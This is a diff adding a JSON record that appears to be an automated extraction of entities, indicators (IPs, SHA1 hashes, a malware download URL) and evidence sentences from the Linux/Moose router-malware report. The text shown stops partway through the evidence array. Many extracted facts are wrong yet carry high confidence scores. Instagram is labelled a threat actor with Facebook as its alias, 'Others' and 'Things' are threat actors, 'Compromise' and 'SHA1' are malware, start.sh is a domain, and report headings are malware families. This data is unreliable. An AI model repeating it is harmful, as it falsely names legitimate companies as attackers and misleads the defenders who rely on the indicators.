@@ -1,0 +1,1533 @@
+{
+  "report_id": "Dissecting-LinuxMoose",
+  "title": "Dissecting Linux/Moose",
+  "source": null,
+  "published_date": null,
+  "report_metadata": {
+    "file_name": "Dissecting-LinuxMoose.pdf",
+    "file_path": "/root/APTtext/Dissecting-LinuxMoose.pdf",
+    "source_type": "pdf",
+    "char_length": 75853,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_Instagram",
+      "type": "ThreatActor",
+      "name": "Instagram",
+      "normalized_name": "Instagram",
+      "aliases": [
+        "Facebook"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_32",
+        "ev_51"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_32",
+      "supporting_evidence_ids": [
+        "ev_51"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Competitive_Moose",
+      "type": "Malware",
+      "name": "Competitive Moose",
+      "normalized_name": "Competitive Moose",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_141",
+        "ev_3"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "family": "Competitive Moose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_3",
+      "supporting_evidence_ids": [
+        "ev_141"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Evolution_of_the_Species",
+      "type": "Malware",
+      "name": "Evolution of the Species",
+      "normalized_name": "Evolution of the Species",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_162",
+        "ev_4"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "family": "Evolution of the Species",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_4",
+      "supporting_evidence_ids": [
+        "ev_162"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Linux_Moose",
+      "type": "Malware",
+      "name": "Linux/Moose",
+      "normalized_name": "Linux/Moose",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_10",
+        "ev_184",
+        "ev_64",
+        "ev_8"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "family": "Linux/Moose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_64",
+      "supporting_evidence_ids": [
+        "ev_184",
+        "ev_8",
+        "ev_10"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Sniffer",
+      "type": "Malware",
+      "name": "Sniffer",
+      "normalized_name": "Sniffer",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_139",
+        "ev_152",
+        "ev_160",
+        "ev_59"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "family": "Sniffer",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_139",
+      "supporting_evidence_ids": [
+        "ev_59",
+        "ev_152",
+        "ev_160"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_MOOSE_HERDING_The_Operation",
+      "type": "Campaign",
+      "name": "MOOSE HERDING The Operation",
+      "normalized_name": "MOOSE HERDING The Operation",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [
+        "ev_28"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_28",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_Facebook",
+      "type": "ThreatActor",
+      "name": "Facebook",
+      "normalized_name": "Facebook",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_32",
+        "ev_51"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_Instagram"
+    },
+    {
+      "id": "ent_threatactor_Others",
+      "type": "ThreatActor",
+      "name": "Others",
+      "normalized_name": "Others",
+      "aliases": [
+        "Yahoo",
+        "Yandex",
+        "Youtube"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_36"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_36",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_Things",
+      "type": "ThreatActor",
+      "name": "Things",
+      "normalized_name": "Things",
+      "aliases": [
+        "IoT"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_malware_Compromise",
+      "type": "Malware",
+      "name": "Compromise",
+      "normalized_name": "Compromise",
+      "aliases": [
+        "IOC",
+        "IOCs"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_109",
+        "ev_123",
+        "ev_174",
+        "ev_5"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_5",
+      "supporting_evidence_ids": [
+        "ev_123",
+        "ev_109",
+        "ev_174"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "family": "Compromise",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_malware_SHA1",
+      "type": "Malware",
+      "name": "SHA1",
+      "normalized_name": "SHA1",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_166"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "family": "SHA1",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_166",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_tool_IPs",
+      "type": "Tool",
+      "name": "IPs",
+      "normalized_name": "IPs",
+      "aliases": [
+        "IP aliases"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_108",
+        "ev_151",
+        "ev_65",
+        "ev_69"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_108",
+      "supporting_evidence_ids": [
+        "ev_69",
+        "ev_151",
+        "ev_65"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "IPs",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_start.sh",
+      "type": "Domain",
+      "name": "start.sh",
+      "normalized_name": "start.sh",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_259",
+        "ev_260"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "start.sh",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_259",
+      "supporting_evidence_ids": [
+        "ev_260"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_www.getcool.com",
+      "type": "Domain",
+      "name": "www.getcool.com",
+      "normalized_name": "www.getcool.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_75"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "www.getcool.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_75",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ipv4_103.238.216.23",
+      "type": "IPv4",
+      "name": "103.238.216.23",
+      "normalized_name": "103.238.216.23",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_252"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "103.238.216.23",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_252",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_13.3.3.7",
+      "type": "IPv4",
+      "name": "13.3.3.7",
+      "normalized_name": "13.3.3.7",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_209",
+        "ev_210",
+        "ev_72"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "13.3.3.7",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_209",
+      "supporting_evidence_ids": [
+        "ev_210",
+        "ev_72"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_192.168.1.1",
+      "type": "IPv4",
+      "name": "192.168.1.1",
+      "normalized_name": "192.168.1.1",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_226"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "192.168.1.1",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_226",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_217.23.7.211",
+      "type": "IPv4",
+      "name": "217.23.7.211",
+      "normalized_name": "217.23.7.211",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_253"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "217.23.7.211",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_253",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_url_http_77.247.177.36_81_xx_atheros_mips_elan2",
+      "type": "URL",
+      "name": "http://77.247.177.36:81/xx/atheros_mips/elan2",
+      "normalized_name": "http://77.247.177.36:81/xx/atheros_mips/elan2",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_220",
+        "ev_251"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "http://77.247.177.36:81/xx/atheros_mips/elan2",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_220",
+      "supporting_evidence_ids": [
+        "ev_251"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha1_095ee85aa648de4e557fc243de17d4f00ab2091f",
+      "type": "SHA1",
+      "name": "095ee85aa648de4e557fc243de17d4f00ab2091f",
+      "normalized_name": "095ee85aa648de4e557fc243de17d4f00ab2091f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_242"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "095ee85aa648de4e557fc243de17d4f00ab2091f",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_242",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451",
+      "type": "SHA1",
+      "name": "10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451",
+      "normalized_name": "10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_241"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "10e2f7dd4b2bb4ac9ab2b0d136f48e5dc9acc451",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_241",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_216014dba6f1a636c44530fbce06c598d3cf7fa1",
+      "type": "SHA1",
+      "name": "216014dba6f1a636c44530fbce06c598d3cf7fa1",
+      "normalized_name": "216014dba6f1a636c44530fbce06c598d3cf7fa1",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_247"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "216014dba6f1a636c44530fbce06c598d3cf7fa1",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_247",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757",
+      "type": "SHA1",
+      "name": "4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757",
+      "normalized_name": "4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_248"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "4bffc0ebfe8c373f387eb01a7c5e2835ec8e8757",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_248",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_54041ce90b04698465b866ed169ddf4a269e1e76",
+      "type": "SHA1",
+      "name": "54041ce90b04698465b866ed169ddf4a269e1e76",
+      "normalized_name": "54041ce90b04698465b866ed169ddf4a269e1e76",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_244"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "54041ce90b04698465b866ed169ddf4a269e1e76",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_244",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_85c3439b6773241d11cda78f0ecfea4c07e55fd2",
+      "type": "SHA1",
+      "name": "85c3439b6773241d11cda78f0ecfea4c07e55fd2",
+      "normalized_name": "85c3439b6773241d11cda78f0ecfea4c07e55fd2",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_246"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "85c3439b6773241d11cda78f0ecfea4c07e55fd2",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_246",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_bfc2a99450977dc7ba2ec0879fb17c612e248ece",
+      "type": "SHA1",
+      "name": "bfc2a99450977dc7ba2ec0879fb17c612e248ece",
+      "normalized_name": "bfc2a99450977dc7ba2ec0879fb17c612e248ece",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_227",
+        "ev_243"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "bfc2a99450977dc7ba2ec0879fb17c612e248ece",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_227",
+      "supporting_evidence_ids": [
+        "ev_243"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_d648c405507ad62ddb3faa1dd37f659f3676cacf",
+      "type": "SHA1",
+      "name": "d648c405507ad62ddb3faa1dd37f659f3676cacf",
+      "normalized_name": "d648c405507ad62ddb3faa1dd37f659f3676cacf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_245"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "d648c405507ad62ddb3faa1dd37f659f3676cacf",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_245",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha1_dd7e8211336aa02851f6c67690e2301b9c84bb26",
+      "type": "SHA1",
+      "name": "dd7e8211336aa02851f6c67690e2301b9c84bb26",
+      "normalized_name": "dd7e8211336aa02851f6c67690e2301b9c84bb26",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_249"
+      ],
+      "report_id": "Dissecting-LinuxMoose",
+      "value": "dd7e8211336aa02851f6c67690e2301b9c84bb26",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_249",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_start.sh",
+      "report_id": "Dissecting-LinuxMoose",
+      "type": "File",
+      "name": "start.sh",
+      "normalized_name": "start.sh",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_259"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "start.sh",
+      "file_role": "file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Dissecting-LinuxMoose",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_Facebook",
+      "tail_id": "ent_threatactor_Instagram",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_32",
+        "ev_51"
+      ],
+      "primary_evidence_id": "ev_32",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    }
+  ],
+  "attack_chain": [],
+  "evidences": [
+    {
+      "id": "ev_3",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s3"
+      },
+      "text": "Competitive Moose — Cleaning other Malware 44 5.6.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s4"
+      },
+      "text": "Evolution of the Species —Malware changelog 50 6.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_5",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s5"
+      },
+      "text": "Appendix A: Malware samples 52 Appendix B: Indicators of Compromise (IOCs) 53 Network-based Indicators 53 Host-based Indicators 53",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_8",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s3"
+      },
+      "text": "EXECUTIVE SUMMARY Linux/Moose is a malware family that primarily targets Linux-based consumer routers but that can infect other Linux-based embedded systems in its path.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_10",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s5"
+      },
+      "text": "Linux/Moose is a standard statically-linked ELF binary that was stripped of any debugging symbols.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "Whether they run on atypical architectures like MIPS or ARM, or they target embedded networked devices — like consumer routers or Internet of Things (IoT) devices — instead of desktops or phones or they are designed to obscure their end goal, these threats arouse our curiosity.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_28",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s1"
+      },
+      "text": "MOOSE HERDING The Operation When looking at the broad possibilities of this malware it is not immediately obvious what its exact purpose is.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_32",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 10,
+        "section": "body",
+        "sentence_id": "p10_s3"
+      },
+      "text": "It is worth noting that most of the HTTP traffic is for the Instagram social network and is upgraded to HTTPS right away using a Location: header.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_36",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 11,
+        "section": "body",
+        "sentence_id": "p11_s1"
+      },
+      "text": "We regrouped the \"Others\" in a separate pie chart to make the graph readable.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_51",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 16,
+        "section": "body",
+        "sentence_id": "p16_s1"
+      },
+      "text": "Moose Taking Selfies — Deep into Instagram The non-operator-related HTTP traffic we were able to observe was of the well-known Instagram social network.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_59",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 21,
+        "section": "body",
+        "sentence_id": "p21_s2"
+      },
+      "text": "Sniffer is activated and waits for HTTP Cookies 3.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_64",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 22,
+        "section": "body",
+        "sentence_id": "p22_s1"
+      },
+      "text": "MOOSE DNA Malware Analysis Linux/Moose is a statically linked ELF binary without debugging symbols.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_65",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 22,
+        "section": "body",
+        "sentence_id": "p22_s2"
+      },
+      "text": "We based our analysis on the MIPS variants of the threat.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_69",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 23,
+        "section": "body",
+        "sentence_id": "p23_s3"
+      },
+      "text": "• 10 threads scanning random IPs • 20 threads scanning closely-related IPs • 1 thread per network interface scanning local-area networks usually protected by the routers themselves",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_72",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 24,
+        "section": "body",
+        "sentence_id": "p24_s3"
+      },
+      "text": "Random scan 10.13.3.0/24 13.3.3.7 13.3.3.7/15 The scanner performs the following operations on each IP.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_75",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 25,
+        "section": "body",
+        "sentence_id": "p25_s3"
+      },
+      "text": "Note The www.getcool.com hostname is unrelated and an attempt to mislead analysis.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_108",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 33,
+        "section": "body",
+        "sentence_id": "p33_s2"
+      },
+      "text": "Additionally, the worm will launch an extra scanner thread per IP interface present on the system, carefully avoiding /32 IPs (IP aliases) and loopback interfaces (like 127.0.0.1):",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_109",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 33,
+        "section": "body",
+        "sentence_id": "p33_s3"
+      },
+      "text": "On successful infection, the newly-compromised machine will spawn scanners on its own internal IP interfaces and thus go deeper inside the private network.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_123",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 36,
+        "section": "body",
+        "sentence_id": "p36_s4"
+      },
+      "text": "The current whitelist of IP addresses is available in the appendix sections under Indicators of Compromise (IOC) .",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_139",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 41,
+        "section": "body",
+        "sentence_id": "p41_s3"
+      },
+      "text": "Name Size Description Version Integer (4 bytes) Version of the malware Message type Integer (4 bytes) Set to 20 meaning the sniffer found a string it was looking for in the network traffic",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_141",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 41,
+        "section": "body",
+        "sentence_id": "p41_s5"
+      },
+      "text": "Competitive Moose — Cleaning other Malware",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_151",
+      "evidence_type": "report_text",
+      "report_id": "Dissecting-LinuxMoose",
+      "locator": {
+        "page": 43,
+        "section": "body",
+        "sentence_id": "p43_s6"
+      },
+      "text": "Whitelist size Integer (4 bytes) Size of the whitelist of IPs allowed to contact the proxy service on port 10073.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
